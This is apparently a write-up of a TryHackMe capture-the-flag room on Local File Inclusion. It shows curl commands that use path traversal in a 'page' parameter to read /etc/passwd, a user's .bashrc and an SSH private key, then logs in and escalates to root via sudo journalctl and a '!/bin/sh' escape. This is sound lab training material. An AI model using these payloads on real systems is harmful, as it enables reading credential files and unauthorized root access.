# Room
https://tryhackme.com/room/lfi

# Task 1
LFI stands for Local File Inclusion.  It is a vulnerability usually found in web servers that allows you to exploit user input to read actual files on the server

# Task 2
LFI requires a parameter based input field that you can pass a malicious value to carry out the exploit and read a sensitive file
* Check page for possible parameters
    ```
    curl --silent http://10.10.227.13 | grep ?
                <a class="nav-link" href="/home?page=about.html">About</a>
                <a class="nav-link" href="/home?page=services.html">Services</a>
                <a class="nav-link" href="/home?page=contact.html">Contact</a>
                <a href="/home?page=about" class="btn btn-success">Leave a Review</a>
    ```
* In the output above page is the parameter and is being feed the values of about.html, services.html, contact.html, and about, now that we know what the paramter is we can check a few things
* LFI references
    * https://book.hacktricks.xyz/pentesting-web/file-inclusion
    * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
* Try LFI for /etc/passwd
    ```
    curl --silent http://10.10.227.13/home?page=../../etc/passwd | grep -v -e "^$" | grep -v "<"
                4.0 stars
                Product Reviews
    
        root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
    lxd:x:105:65534::/var/lib/lxd/:/bin/false
    uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
    pollinate:x:109:1::/var/cache/pollinate:/bin/false
    falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
    sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
    ```
* An interesting user is falcon, try to look at falcon's .bashrc
    ```
    curl --silent http://10.10.227.13/home?page=../../home/falcon/.bashrc | grep -v -e "^$" | grep -v "<" | tail -10
    # this, if it&#39;s already enabled in /etc/bash.bashrc and /etc/profile
    # sources /etc/bash.bashrc).
    if ! shopt -oq posix; then
    if [ -f /usr/share/bash-completion/bash_completion ]; then
        . /usr/share/bash-completion/bash_completion
    elif [ -f /etc/bash_completion ]; then
        . /etc/bash_completion
    fi
    fi
    ```
* Check to see if you can grab falcon's private key
    ```
    curl --silent http://10.10.227.13/home?page=../../home/falcon/.ssh/id_rsa | grep -v -e "^$" | grep -v "<"
                4.0 stars
                Product Reviews
    
        -----BEGIN RSA PRIVATE KEY-----
    [removed]
    -----END RSA PRIVATE KEY-----
    ```
* Login using falcon's private key and grab the user flag
    ```
    vim id_rsa                                         
    chmod 600 id_rsa                                    
    ssh -i id_rsa falcon@10.10.227.13            
    falcon@walk:~$ cat user.txt
    [removed]
    ```
# Task 3
Escalate privileges
* Check sudo -l
    ```
    falcon@walk:~$ sudo -l
    Matching Defaults entries for falcon on walk:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User falcon may run the following commands on walk:
        (root) NOPASSWD: /bin/journalctl
    ```
* Research /bin/journalctl at GTFOBins
* Exploit /bin/journalctl access and drop to a shell, grab the root flag
    ```
    falcon@walk:~$ sudo /bin/journalctl                                                                                                                                 
    -- Logs begin at Tue 2020-01-28 19:00:21 IST, end at Mon 2021-02-01 03:42:24 IST. --

    !/bin/sh
    # id
    uid=0(root) gid=0(root) groups=0(root)
    # 
    ```